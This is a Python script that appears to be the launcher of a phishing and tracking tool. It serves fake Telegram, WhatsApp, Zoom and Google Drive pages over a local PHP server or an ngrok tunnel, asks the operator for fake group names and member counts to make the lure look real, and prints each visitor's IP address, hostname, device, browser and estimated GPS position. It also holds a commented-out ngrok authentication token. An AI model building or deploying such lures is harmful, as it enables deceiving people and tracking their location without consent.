from os import system, kill, name
import json
import time
import argparse
from datetime import date
import subprocess
from python.track import open_result_file, get_gps_position, get_hostname

TEMPLATE    = "views"
DRIVE       = f'{TEMPLATE}/'
GIFT        = f'{TEMPLATE}/'
TOMBOLA     = f'{TEMPLATE}/'
TELEGRAM    = f'{TEMPLATE}/telegram'
WHATSAPP    = f'{TEMPLATE}/whatsapp/'
ZOOM        = f'{TEMPLATE}/zoom'
PORT        = 8000
CONFIG_FILE = f'conf.json'
LOG_FILE    = f'logs/{date.today()}.log'
NGROK_LOG   = f'logs/ngrok_{date.today()}.log'
IP          = f'127.0.0.1:{PORT}'
global proccesss
proccesss = []
VERSION = '1.2.8'
R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow
NGROK_SERVER_URL = 'C:\\Users\\Kassoum\\Documents\\tools\\ngrok.exe'

def killProcess(proccesss):
    for item in proccesss:
        kill(item.pid, 2)

def clean_screen():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

def start_ngrok_server():
    command = f'start {NGROK_SERVER_URL} http {PORT}'
    # command = f'{NGROK_SERVER_URL} config add-authtoken 2C4QRfq1f59Pwi734Iqd1jFAOZS_4EQgMEPNzcWPxUbQsUYKb'
    system(command)

def start_local_server(template, ngrok_serve=1):
    command = ['php', '-S', f'{IP}', '-t', f'{template}']
    global proccesss
    with open(LOG_FILE, 'w+') as log_file:
        result = subprocess.Popen(command, stdout=log_file, stderr=log_file)
    if ngrok_serve == 2:
        start_ngrok_server()
    proccesss.append(result)

def set_config_file(params):
    with open(CONFIG_FILE, 'w') as file:
        file.write(params)

def get_input(msg):
    while True:
        try:
            response = format(input(f'{msg} => '))
            if len(response) != 0:
                break
            elif type(response) == int and response > 0:
                print(response)
                break
        except Exception as e:
            continue
    return response

def read_data():
    print(f'Server start on: {IP}\n')
    current_ip = []
    while True:
        data = open_result_file()
        if data != None:
            if data["user_ip"] not in current_ip:
                current_ip.append(data["user_ip"])
                print(f'{"*"*50}')
                print(f'New IP:         {data["user_ip"]}')
                print(f'Hostname:       {get_hostname(data["user_ip"])}')
                print(f'is_mobile:      {data["mobile"]}')
                print(f'Platform:       {data["platform"]}')
                print(f'Vendor:         {data["vendor"]}')
                print(f'User Browser:   {data["userAgent"]}')
                print(f'GPS position:   {get_gps_position(data["user_ip"])}\n')
            else:
                time.sleep(5)
        else:
            time.sleep(5)

def telegran(choice):
    icon_file_name  = 'computer.jpg'
    group_name      = get_input('Enter group name')
    group_describe  = get_input('Group describe')
    all_member      = get_input('Group members count')
    online_member   = get_input('Online members count')
    data            = {
        "icon_file_name": icon_file_name,   "group_name"    : group_name,
        "all_member"    : all_member,       "online_member" : online_member,
        "group_describe": group_describe
    }
    params = json.dumps(data)
    set_config_file(params)
    start_local_server(TELEGRAM, choice)
    time.sleep(2)
    read_data()

def whatsapp(choice):
    icon_file_name  = 'computer.jpg'
    group_name      = get_input('Enter group name')
    data            = { "icon_file_name": icon_file_name, "group_name"    : group_name }
    params          = json.dumps(data)
    set_config_file(params)
    start_local_server(WHATSAPP, choice)
    time.sleep(2)
    read_data()

def zoom(choice):
    start_local_server(ZOOM, choice)
    time.sleep(2)
    read_data()

def choose_server(template):
    print(f'Choose your server')
    print(f'[1] Local server')
    print(f'[2] Ngrok server')
    try:
        choice = int(input('[defualt 1]=> '))
    except Exception as e:
        choice = 1
    if choice > 2:
        choice = 1
    
    if template =='d':
        return 'drive'
    if template =='g':
        return 'g'
    if template =='t':
        telegran(choice)
    if template =='w':
        whatsapp(choice)
    if template =='z':
        zoom(choice)
    
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-d', '--drive', help='Google drive', action='store_true')
        parser.add_argument('-g', '--gift', help='Gift', action='store_true')
        parser.add_argument('-t', '--telegran', help='Telegram', action='store_true')
        parser.add_argument('-w', '--whatsapp', help='Whatsapp', action='store_true')
        parser.add_argument('-z', '--zoom', help='Whatsapp', action='store_true')
        args = parser.parse_args()
        
        clean_screen()

        if args.drive:
            choose_server('d')
        elif args.gift:
            choose_server('g')
        elif args.telegran:
            choose_server('t')
        elif args.whatsapp:
            choose_server('w')
        elif args.zoom:
            choose_server('z')
        if args.drive is False and args.gift is False and args.telegran is False and args.whatsapp is False and args.zoom is False:
            parser.print_help()
        
    except KeyboardInterrupt as e:
        print(f'User interruption........')
        killProcess(proccesss)